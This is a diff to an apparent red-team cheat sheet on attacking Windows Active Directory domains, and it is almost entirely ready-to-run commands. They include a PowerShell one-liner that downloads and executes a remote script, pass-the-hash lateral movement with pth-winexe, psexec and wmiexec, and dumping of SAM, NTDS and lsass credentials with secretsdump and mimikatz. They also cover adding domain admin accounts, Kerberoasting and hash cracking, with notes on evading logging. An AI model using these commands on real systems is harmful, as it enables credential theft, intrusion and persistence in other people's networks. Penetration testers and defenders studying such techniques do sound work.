@@ -108,6 +108,8 @@ Note that the above commands do not work with runas. Below PowerView functions w
 
 Search shares and files using Invoke-FileFinder and Invoke-ShareFinder
 
+## Domain Analysis
+
 ### BloodHound
 
 Run locally on non-domain joined machine (remember to add target domain to registry):
@@ -120,4 +122,157 @@ Run locally on non-domain joined machine (remember to add target domain to regis
 
 `SharpHound.exe --CollectionMethond All`
 
+### Run from remote shell
 
+Useful when you have a remote shell.
+
+`powershell Set-ExecutionPolicy RemoteSigned`
+
+`powershell -command "& { . C:\BloodHound.ps1; Invoke-BloodHound }"`
+
+### Run from web server or over Internet:
+
+Use this when you cannot copy BloodHound.ps1 over to target.
+
+`powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'); Invoke-BloodHound"`
+
+## Compromise and Lateral Movement
+
+### Winexe to boxes (not opsec safe) - service is run. No cleanup.
+
+`pth-winexe //10.0.0.1 -U DOMAINBLAH/blahuser%blahpassword cmd`
+
+`pth-winexe //10.0.0.1 -U DOMAINBLAH/blahuser%hash cmd`
+
+### Impacket psexec.py to boxes (not opsec safe) - does cleanup after but leaves logs after installing and running service.
+
+`psexec.py user@IP`
+
+`psexec.py user@IP -hashes ntlm:hash`
+
+### Impacket wmiexec.py (opsec safe - unless WMI logging is enabled)
+
+`wmiexec.py user@IP`
+
+`wmiexec.py user@IP -hashes ntlm:hash`
+
+### Impacket smbclient (probably opsec safe as its just using SMB)
+
+`python smbclient.py domain/blahuser@10.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:blah`
+
+## Password dumping
+
+### From Live Kali on a workstation
+`samdump2 SYSTEM SAM > hashes.txt`
+
+### Local
+
+`C:\> reg.exe save hklm\sam c:\temp\sam.save`
+
+`C:\> reg.exe save hklm\security c:\temp\security.save`
+
+`C:\> reg.exe save hklm\system c:\temp\system.save`
+
+`secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
+
+`pwdump system sam`
+
+### In Memory
+`C:\> procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1`
+
+`C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit`
+
+
+### Domain 
+
+To find where NTDS is run the below:
+
+`reg.exe query hklm\system\currentcontrolset\services\ntds\parameters`
+
+### vssadmin
+
+`C:\vssadmin list shadows`
+
+`C:\vssadmin create shadow /for=C:`
+
+`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .`
+
+`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .`
+
+`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .`
+
+`secretsdump.py -system system.save -ntds ntds.dit LOCAL  -just-dc-ntlm`
+
+`vssadmin delete shadows /shadow={cd534584-a272-44ab-81e1-ab3f5fbe9b29}`
+
+### ntdsutil
+
+`ntdsutil`
+
+`ntdsutil: snapshot`
+
+`ntdsutil: list all`
+
+`ntdsutil: create`
+
+`snapshot: mount 1`
+
+Cleanup snapshots:
+
+`snapshot: list all`
+
+`snapshot: unmount 1`
+
+`snapshot: list all`
+
+`snapshot: delete 1`
+
+## Post Compromise (Not opsec safe)
+Add user to local admin and domain admin
+
+### Add Domain Admin
+`net user username password /ADD /DOMAIN`
+
+`net group "Domain Admins" username /ADD /DOMAIN`
+
+### Add Local Admin
+`net user username password /ADD`
+
+`net localgroup Administrators username /ADD`
+
+
+### Tasklist scraper to find logged in admins
+
+If powershell not enabled or unable to run BloodHound this script will find admins.
+
+`#!/bin/sh`
+
+`for ip in $(cat ip.txt);do`
+
+`pth-winexe -U Admin%hash //$ip "ipconfig"`
+
+`pth-winexe -U Admin%hash //$ip "tasklist /v"`
+
+`done`
+
+### Kerberoasting
+
+https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1
+
+Invoke-AutoKerberoast
+
+### Hashcat Alienware - kerbtgt hash cracking
+
+`sudo apt-get install nvidia-367`
+
+`sudo nvidia-smi`
+
+`reboot`
+
+`sudo hashcat -I`
+
+`hashcat -m 13100 kerb.txt ~/Downloads/realuniq.lst` 
+
+### LAPS - GetLAPSPasswords
+
+https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
